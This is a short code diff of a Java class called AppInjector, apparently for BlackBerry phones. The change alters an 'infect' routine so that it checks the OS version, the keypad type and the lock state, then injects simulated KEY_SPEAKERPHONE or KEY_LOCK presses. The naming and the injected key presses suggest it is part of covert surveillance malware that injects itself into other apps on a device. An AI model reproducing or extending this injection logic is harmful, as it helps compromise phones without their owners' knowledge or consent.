@@ -119,21 +119,36 @@ public class AppInjector {
         }
 
         Utils.sleep(delegate.getDelay());
-        
+
         //#ifdef DEBUG
         debug.trace("infect getHardwareLayout: " + Keypad.getHardwareLayout());
+
         //#endif
-        if (Device.getInstance().atLeast(4, 7)
-                && Keypad.isValidKeyCode(Keypad.KEY_LOCK)) {
-            
-            //#ifdef DEBUG
-            debug.trace("infect: KEY_LOCK");
-            //#endif
-         // con 9700 :
-            KeyInjector.pressRawKeyCode(Keypad.KEY_LOCK);
+        if (Device.getInstance().atLeast(4, 7)) {
+            debug.trace("infect media " + Keypad.hasMediaKeys());
+            debug.trace("infect mute " + Keypad.hasMuteKey());
+            //debug.trace("infect " + Keypad.isOnKeypad((char) Keypad.KEY_LOCK));
+
+            boolean locked = ApplicationManager.getApplicationManager()
+                    .isSystemLocked();
+            debug.trace("locked " + locked);
+
+            if (Keypad.hasMediaKeys()) {
+                //#ifdef DEBUG
+                debug.trace("infect: KEY_SPEAKERPHONE");
+                //#endif
+                // con 9300 funziona:
+                KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
+            } else {
+                //#ifdef DEBUG
+                debug.trace("infect: KEY_LOCK");
+                //#endif
+                // con 9700 :
+                KeyInjector.pressRawKeyCode(Keypad.KEY_LOCK);
+            }
 
         } else {
-          //#ifdef DEBUG
+            //#ifdef DEBUG
             debug.trace("infect: KEY_SPEAKERPHONE");
             //#endif
             // con 9300 funziona:
